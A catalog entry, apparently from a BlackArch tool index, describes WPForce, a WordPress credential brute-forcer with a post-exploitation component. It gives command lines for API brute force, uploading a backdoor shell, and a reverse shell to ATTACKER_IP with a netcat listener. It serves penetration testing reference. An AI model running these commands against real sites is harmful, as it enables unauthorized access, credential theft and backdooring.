---
name: "wpforce"
categories:
  - blackarch-webapp
version: "88.b72ec64"
homepage: "https://github.com/n00py/WPForce"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "n00py/WPForce"
github-stars: 983
github-pushed: "2021-02-16"
github-archived: false
github-issues: 12
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# wpforce

> WordPress attack suite: API-based credential brute force (wpforce) plus admin post-exploitation (yertle).

## What it's for

WPForce (by n00py) is a suite of two Python tools. `wpforce` brute-forces WordPress credentials through the API rather than the login form, bypassing some form-level protections. Once admin credentials are found, `yertle` (packaged as `wpforce-yertle`) uses them to upload a shell and run post-exploitation modules: an interactive os-shell, reverse shells, dumping WordPress password hashes, backdooring the authentication function to capture plaintext credentials, injecting a BeEF hook into pages, and pivoting to Meterpreter. It is Python 2-era tooling from 2017; modern WordPress hardening limits parts of this surface. Note: rastating's WordPress Exploit Framework is an unrelated project despite the similar role.

## Typical use cases

### Brute-force logins via the API

```
wpforce -i users.txt -w passwords.txt -u https://target.example.com
```

Outcome: multi-threaded (default 10 threads) attempts of every user/password pair against the target's API; valid pairs print as found — admin accounts are flagged — and all working pairs are summarized at completion.

### Get an interactive shell with admin credentials

```
wpforce-yertle -u admin -p Password1 -t https://target.example.com -i
```

Outcome: logs in as admin, uploads the backdoor (printing the upload directory), and drops into an `os-shell>` prompt; from there the built-in command menu (help via `?`) reaches the post-exploitation modules such as hash dumping and BeEF injection.

### Spawn a reverse shell instead

```
wpforce-yertle -u admin -p Password1 -t https://target.example.com -r -li ATTACKER_IP -lp 4444
```

Outcome: uploads the shell and connects back to the listener (e.g. `nc -lvp 4444` on ATTACKER_IP), yielding a full interactive session; `-e` skips the upload and reuses an existing shell.

*No corpus evidence — derived from upstream documentation (README usage and feature list).*
